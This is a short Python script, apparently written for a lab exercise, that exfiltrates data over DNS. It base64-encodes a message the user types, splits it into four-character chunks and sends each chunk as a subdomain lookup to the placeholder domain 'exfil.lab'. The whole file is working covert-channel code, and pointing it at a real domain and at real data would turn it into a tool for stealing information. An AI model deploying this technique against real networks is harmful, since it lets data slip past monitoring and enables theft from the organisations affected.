import base64
import time
import dns.resolver

# Function to base64-encode data
def encode_data(data_string):
    b64_encoded_data = base64.b64encode(data_string.encode()).decode()
    return b64_encoded_data

# Function to split data into chunks of size N
def chunks(b64_encoded_data):
    chunk_size = 4
    chunks = []
    for i in range(0, len(b64_encoded_data), chunk_size):
        chunk = b64_encoded_data[i: i + chunk_size]
        chunks.append(chunk)
    return chunks

# Function to create crafted subdomains and send the DNS queries
def send_dns(chunks):
    domain = ".exfil.lab"
    for chunk in chunks:
        tunnel_data = chunk + domain
        try:
            dns.resolver.resolve(tunnel_data, 'A')
        except Exception as e:
            print(f"[!] DNS query failed for {tunnel_data}: {e}")
        time.sleep(1)

def main():
    string = input("Enter the message to exfiltrate: ")
    encoded_data = encode_data(string)
    chunked_data = chunks(encoded_data)
    send_dns(chunked_data)

if __name__ == "__main__":
    main()
